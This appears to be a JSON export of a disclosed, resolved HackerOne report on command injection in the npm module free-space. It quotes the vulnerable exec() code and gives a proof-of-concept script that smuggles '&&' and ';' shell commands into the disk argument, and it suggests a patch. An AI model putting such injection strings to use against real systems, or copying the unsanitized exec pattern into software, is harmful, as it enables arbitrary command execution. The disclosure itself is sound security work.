{
  "id": 950192,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTAxOTI=",
  "url": "https://hackerone.com/reports/950192",
  "title": "[@knutkirkhorn/free-space] - Command Injection through Lack of Sanitization",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-08-03T13:23:37.941Z",
  "submitted_at": "2020-08-03T13:23:37.958Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ansuj7",
    "url": "/ansuj7",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-09-18T12:35:51.099Z",
  "bug_reporter_agreed_on_going_public_at": "2020-09-18T12:35:51.053Z",
  "team_member_agreed_on_going_public_at": "2020-08-25T16:18:34.574Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report ```Command Injection``` in the ```free-space``` module.\nIt allows ```arbitrary shell command execution on Unix-based systems```\n\n# Module\n\n**module name:** ```free-space```\n**version:** ```1.2.0```\n**npm page:** `https://www.npmjs.com/package/free-space`\n\n## Module Description\n\n Get the amount of free space for a drive\n\n## Module Stats\n\n24 Weekly Downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue is triggered due to the lack of sanitization of the input parameter of the library's exported anonymous function. \nThe exported function, when given a parameter checks what platform the code is being run on and sends that parameter to a function call in either ```lib/unix.js``` or ```lib/windows/js```.\nThe vulnerability exists in ```lib/unix.js``` which directly uses the user-input parameter: ```disk``` in the template string that ultimately gets exec-ed.\n\nBelow is the library's ```index.js``:\n\n```javascript\n'use strict';\nconst systemDisk = require('system-disk');\nconst windows = require('./lib/windows.js');\nconst unix = require('./lib/unix.js');\n\nmodule.exports = disk => {\n    if (disk === undefined) {\n        return new Promise(resolve => {\n            systemDisk().then(newDisk => {\n                disk = newDisk;\n\n                if (process.platform === 'win32') {\n                    resolve(windows(disk));\n                } else {\n                    resolve(unix(disk));\n                }\n            });\n        });\n    } else {                   // this code executes if a parameter is passed to this function\n        if (typeof disk !== 'string') {\n            throw new TypeError('Invalid input');\n        }\n\n        if (process.platform === 'win32') {    // calls lib/windows.js with the input parameter\n            return windows(disk);\n        }\n\n        return unix(disk);    // calls lib/unix.js with the input parameter\n    }\n};\n```\n\nBelow is the bug in ```lib/unix.js```:\n```javascript\n'use strict';\nconst {exec} = require('child_process');\n\nmodule.exports = disk => {\n    return new Promise((resolve, reject) => {\n        exec(`df -k | grep ^${disk} | awk '{print $4}'`, (err, stdout, stderr) => { // 'disk' is the parameter passed here from the library's exported call\n            if (stderr) {\n                reject(new Error('Something wrong happened'));\n                return;\n            }\n\n            if (stdout.length === 0 || err) {\n                reject(new Error('Could not find disk: ' + disk));\n            }\n\n            resolve(parseInt(stdout, 10) * 1024);\n        });\n    });\n};\n```\nDue to the parameter directly being passed to ```exec```, a ```;```or ```&&``` followed by commands will cause each command after the delimiting character to be executed.\n\n\n## Steps To Reproduce:\n\nCreate testing directory: ```mkdir free-space-poc```\nInstall package: ```npm install (@)knutkirkhorn/free-space```\n\nCreate the following script  - ```test.js``` in the testing directory:\n```javascript\nconst freeSpace = require('@knutkirkhorn/free-space');\n\nfreeSpace(' && echo AMPERSAND_EXEC > ./CODEEXEC').then(bytes => {\n    console.log('AMPERSAND: Free space: ' + bytes + '\\n');\n});\n\nfreeSpace(' ; echo SEMICOLON_EXEC >> ./CODEEXEC').then(bytes => {\n    console.log('SEMICOLON: Free space: ' + bytes + '\\n');\n});\n``` \nExecute with ```nodejs test.js```\n\nList the directory with ```ls```\nYou will see the file ```CODEEXEC``` has been created in the current directory with output from injected commands. ```cat CODEEXEC```\n{F934570}\n\n## Patch\n\nSanitize the ```disk``` parameter before passing it into ```exec``` in ```lib/unix.js``` - Cut out everything after a ```;  and  && ``` and ensure that the disk does exist before calling ```exec```.\n\n## Supporting Material/References:\n\n- Operating System Version: Ubuntu 18.04.4 LTS\n- NodeJS Version: v8.10.0\n- NPM Version: 6.14.7\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N \n\nThank you for your time.\n\n## Impact\n\nCommand Injection can lead to information gathering, system enumeration and further execution of scripts/binaries.",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 934570,
      "file_name": "free-space-poc.PNG",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vkd2xLhLfpR92w7PVxApRReR?response-content-disposition=attachment%3B%20filename%3D%22free-space-poc.PNG%22%3B%20filename%2A%3DUTF-8%27%27free-space-poc.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6UDGEAWX%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T090138Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDtomjzste%2FJyV7XywzlEJQYeqQ2gl1GbRXR68XAax2ZAIhAOXu4GCq8m%2Baons%2BoeD1F5wi6eBebA%2Flbq7z6%2BT5S13%2BKrIFCBEQAxoMMDEzNjE5Mjc0ODQ5Igz0Z1zn%2F0sHyj01UDIqjwU1Vm8BSQ8mwy%2F6URVMkd4PMFnas4kNcnyAhizE%2FtAF0Zo2Rf6osehF9A0vFXUqzBhf%2Bx0tn9BCykRmXL4LADQW2zG0CjvKZ8o0FRejBpfc4ABGr0s2kaBm20dZN46YJj%2Fci9fvZZXks24BJ4R9FMOr8BTuVz1b6QJuLu5ZvF5SijVlIc7qDZpcNOQwUKQGZCKhAiyKxV%2FPdj2wtABwdYRFChvP5HrC0OEE1b1JkM2XVLw3MrttmYe79K24scbCWlu8TNxqz0c%2FHPqayQ2dcErgzkMB%2BG35OzxBXU6KuQhgq3x1CaBaQmC53tpFEwzHDIqZAjrCB3v2l1n8xP9RpfzVSUPz1Pw0mgEQ9vCVLos1WkT5c%2BVghNfCgtN3ZZNakSb0Xo63aLDeyNrDmRQ8N%2B0cAT39RFVD0dFvarC3AlomGqz73cmjaGlZBK6npaBOjh1VijNsw9IEssbOxzts8eaEYK04YEGZiArUQdOKUa6NSYTFNE9DySi12E6zuoqSUQ1%2BM3xg5%2F9a2ezeWFPMfkI%2Fk9xd2H8QobL5HDm%2BQxoo1Xd6C5TY0CDPjWc%2FVJ3Vg%2FujtX7B4YRVGnIhw%2FoVcet%2B7BLsy8samnFShP75uWkw2TESNibZccSBFG796cZdoI9LTNSeL4unuO2lr5qZbVZ%2B%2FQUOVomf6UIfEiz9ILQjOk0%2BeK70YMy6KsInBS4cs6KqHtW6uE0qiPxPC9Sf7YzmKg%2BNKHU8n9%2FJw%2FqdR08dm8FIvGCU3ChxBLT3c25ARE1rgNzEq8WwPQrJLsh4rw%2BPPKCi%2FaLX%2BPeMqnZoxYGJwWYRGsecNgVXF9N06HvTmAyFbl4qGh3DTeqixRHICHUfrCgOj91rnM8kOOeD7hRPMOHkvsYGOrABpQSx1GCRLInHCXgDgl1ei25b5ml%2FW5yrarH%2F4hx%2Bpaa2NMHSkoQOdGhh4sgYrEm%2Fg8oceBhDenU%2FCZmSorsoUVnuQ8C%2FNWEvu2Wg8KqMzrZH7Ek10qtr%2BHD5B7EUJL%2FtIDQV%2BnRfKsDezaCHqPTezQYVw1%2BhPbFCChJ54naSnmcfE3%2FgNFA86zKuNC6LwZ%2B%2FE7Ca5CrnxQljX1VW8ORWPAWCMpgJnIFZwdXgidA9r%2BA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=17b275b3d20efb82c435ad2990271ee572d214e74cd9b6ad4d334dd21a574c8a",
      "file_size": 22654,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-09-24T16:18:34.655Z",
  "allow_singular_disclosure_after": -157480983.37523663,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "hariprasanna1",
    "devolution",
    "haltosan",
    "xyber_wolf",
    "younggoon",
    "tariktarik",
    "xyzo"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.8,
    "author_type": "User",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
